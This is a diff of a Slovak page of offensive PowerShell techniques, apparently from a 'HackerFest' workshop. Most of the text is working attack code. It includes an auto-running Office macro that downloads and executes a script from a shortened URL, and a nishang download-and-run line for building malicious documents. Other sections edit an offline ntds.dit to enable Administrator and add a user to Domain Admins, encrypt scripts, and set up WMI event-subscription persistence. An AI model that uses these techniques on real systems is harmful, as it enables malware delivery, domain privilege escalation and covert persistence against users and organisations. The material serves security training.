@@ -7,35 +7,33 @@ lang: sk
 permalink: /sk/powershell/
 sitemap: false
 ---
-&nbsp;
 
 ## Office dokument s&nbsp;automaticky spúšťaným makrom
 
 Vytvorte Office dokument (Word / Excel / PowerPoint) a&nbsp;vložte do&nbsp;neho cez&nbsp;makrá tento kód:
 
 ```vb
-' Kompatibilita s&nbsp;MS Word
+' Kompatibilita s MS Word
 Sub Auto_Open()
-    Dim exec As&nbsp;String
+    Dim exec As String
     cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/e0Mw9w'))"""
     Shell (cmd)
 End Sub
 
-' Kompatibilita s&nbsp;MS PowerPoint
+' Kompatibilita s MS PowerPoint
 Sub AutoOpen()
     Auto_Open
 End Sub
 
-' Kompatibilita s&nbsp;MS Excel
+' Kompatibilita s MS Excel
 Sub Workbook_Open()
     Auto_Open
 End Sub
 ```
-```
+## Automatické generovanie dokumentov s makrami
 
-## Automatické generovanie dokumentov s&nbsp;makrami
 ```powershell
-# Import prikazu Out-Word z&nbsp;modulu nishang
+# Import prikazu Out-Word z modulu nishang
 IEX(IWR 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
  
 # Vytvorenie payloadu
@@ -59,10 +57,10 @@ Import-Module -Name DSInternals
 $targetFolder = 'C:\HackerFest\ActiveDirectory'
 mkdir -Path $targetFolder -Force
 
-&lt;#
+<#
 Manuálny krok: Stiahnite a&nbsp;rozbaľte súbor ntds.zip z&nbsp;adresy
 https://1drv.ms/f/s!Ah1NVj_AudV4iZ1M_EF6HUu1dLT9KA do&nbsp;C:\HackerFest\ActiveDirectory
-#&gt;
+#>
 
 # Zobrazenie informácií o&nbsp;databáze
 $dbFile = Join-Path $targetFolder ntds.dit
@@ -91,7 +89,7 @@ Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccoun
 Enable-ADDBAccount -SamAccountName Administrator -DBPath $dbFile
 Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled
 
-&lt;# Zmena členstva v&nbsp;primárnej skupine Potrebujeme zoznam dobre známych RIDov: https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems Napríklad: 512 Domain Admins 513 Domain Users 515 Domain Computers 516 Domain Controllers 519 Enterprise Admins #&gt;
+<# Zmena členstva v&nbsp;primárnej skupine Potrebujeme zoznam dobre známych RIDov: https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems Napríklad: 512 Domain Admins 513 Domain Users 515 Domain Computers 516 Domain Controllers 519 Enterprise Admins #>
 Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId
 Set-ADDBPrimaryGroup -SamAccountName Wendy -PrimaryGroupId 512 -DBPath $dbFile
 Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId
@@ -122,7 +120,7 @@ Out-EncodedCommand -ScriptBlock { Get-Process | Out-GridView -Wait }
 
 ```powershell
 # Vytvorenie cleartext scriptu
-echo 'Get-Process' &gt; clear.ps1
+echo 'Get-Process' > clear.ps1
 
 # Vytvorenie zašifrovaného skriptu
 Out-EncryptedScript -ScriptPath .\clear.ps1 -Password SuperSecret -Salt Random -FilePath evil.ps1
@@ -180,7 +178,7 @@ Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptio
 [WMI Explorer](https://github.com/vinaypamnani/wmie2)
 ```powershell
 $payload = {
-    Get-Date &gt;&gt; C:\test.txt
+    Get-Date >> C:\test.txt
 }
 
 $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
@@ -196,7 +194,7 @@ $timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
 $filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
     EventNamespace = 'root/cimv2'
     Name = 'TimerTrigger'
-    Query = "SELECT * FROM&nbsp;__TimerEvent WHERE&nbsp;TimerID = 'PayloadTrigger'"
+    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"
     QueryLanguage = 'WQL'
 }
 
@@ -213,7 +211,7 @@ $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subs
 # Cleanup
 $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
 $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
-$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF&nbsp;{$($consumer.__RELPATH)} WHERE&nbsp;ResultClass = __FilterToConsumerBinding"
+$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($consumer.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
 $timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"
 
 Remove-WmiObject -InputObject $binding
@@ -297,7 +295,7 @@ $parameters = $Category,
               $File
 ## Invoke the&nbsp;API 
 # [void] (Invoke-WindowsApi "kernel32.dll" ([UInt32]) "GetPrivateProfileString" $parameterTypes $parameters)
-Invoke-Command -ScriptBlock $scriptBlock -ArgumentList 'kernel32.dll',([UInt32]),'GetPrivateProfileString',$parameterTypes,$parameters &gt; $null
+Invoke-Command -ScriptBlock $scriptBlock -ArgumentList 'kernel32.dll',([UInt32]),'GetPrivateProfileString',$parameterTypes,$parameters > $null
 
 ## And&nbsp;return the&nbsp;results 
 $returnValue.ToString()
